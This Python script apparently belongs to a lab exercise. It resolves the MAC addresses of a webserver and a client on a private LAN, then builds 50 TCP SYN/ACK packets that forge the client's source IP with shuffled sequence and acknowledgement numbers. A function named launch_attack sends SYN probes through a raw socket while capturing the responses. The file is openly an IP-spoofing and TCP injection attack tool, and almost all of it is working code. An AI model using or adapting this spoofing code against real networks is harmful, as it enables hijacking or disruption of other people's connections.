import socket
import binascii
import time
import datetime
import random
import pyshark
import dpkt
from pylibpcap import sniff
from util.netutil import get_mac_for_ip,fetch_local_details, IP, TCP, ARP
from util.sniffutil import Pcap
from getmac import get_mac_address as gma

iface_name = ""
target_ip = "192.168.0.230" #webserver ip
target_port = 80            #webserver port
target_eth_adr = b''        #webserver mac
local_ip = "192.168.0.197"  #local ip
local_eth_adr = b''         #local mac
spoofed_ip = "192.168.0.168"#client ip
spoofed_eth_adr = b''       #client mac

def setup():
    global iface_name
    global local_ip
    global local_eth_adr
    global target_eth_adr
    global spoofed_eth_adr

    #get local ip and mac adress
    iface_name, local_ip, local_eth_adr = fetch_local_details()
    print(f'[+] Auto setting interface to {iface_name}!')
    print(f'[+] Found ip {local_ip} and mac address {local_eth_adr} for the local device')
    local_eth_adr = bytes.fromhex(local_eth_adr.replace(":", " "))

    #get target mac adress
    if not target_ip == local_ip:
        target_eth_adr = get_mac_for_ip(iface_name,(local_ip,local_eth_adr), target_ip)
        print(f"[+] Found server ({target_ip}:{target_port}) at {target_eth_adr}")
        target_eth_adr = bytes.fromhex(target_eth_adr.replace(":", ""))
    else:
        target_eth_adr = local_eth_adr
        print(f"[+] Found server ({target_ip}:{target_port}) at {gma()}") 

    #get the mac adress of the client
    spoofed_eth_adr = get_mac_for_ip(iface_name,(local_ip,local_eth_adr), spoofed_ip)
    print(f"[+] Found client ({spoofed_ip}) at {spoofed_eth_adr}")
    spoofed_eth_adr = bytes.fromhex(spoofed_eth_adr.replace(":", ""))
    
    print("[+] Setup complete!")

def launch_attack(probes, sock):
    #pcapFilter = f'tcp and host {target_ip} and host {local_ip} and port 1337'
    
    pcap = Pcap()
    pcap.activate()

    for pkt in probes:
        sock.send(bytes(pkt))

    pcap.deactivate(6)

def main():

    #spoofed
    spoofed = []

    seq, ack = [],[]
    seqS = random.randint(0, pow(2,32))
    ackS = random.randint(0, pow(2,32))
    for i in range(0,50):
        seq.append(seqS+i)
        ack.append(ackS+i)

    random.shuffle(seq)
    random.shuffle(ack)

    for i in range(0,50):
        tcp = TCP(sport=1111, dport=target_port, seq=seq[i],ack=ack[i], flags=[dpkt.tcp.TH_SYN,dpkt.tcp.TH_ACK])
        ip = IP((spoofed_ip,spoofed_eth_adr), (target_ip,target_eth_adr), tcp.build())
        spoofed.append(ip.build())

    #probes
    tcp = TCP(sport=10001, dport=80, flags=[dpkt.tcp.TH_SYN])
    ip = IP((local_ip,local_eth_adr), (target_ip,target_eth_adr), tcp.build())
    #probes = [ip.build()] + spoofed +  [ip.build()]

    #ip = IP((spoofed_ip,local_ip),(target_ip,target_eth_adr), tcp=tcp.build())

    probes = [ip.build()]+[ip.build()]
    
    with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, dpkt.ip.IP_PROTO_IP) as sock:
        sock.bind((iface_name,1))
        launch_attack(probes, sock)

if __name__ == "__main__":
    setup()
    main()

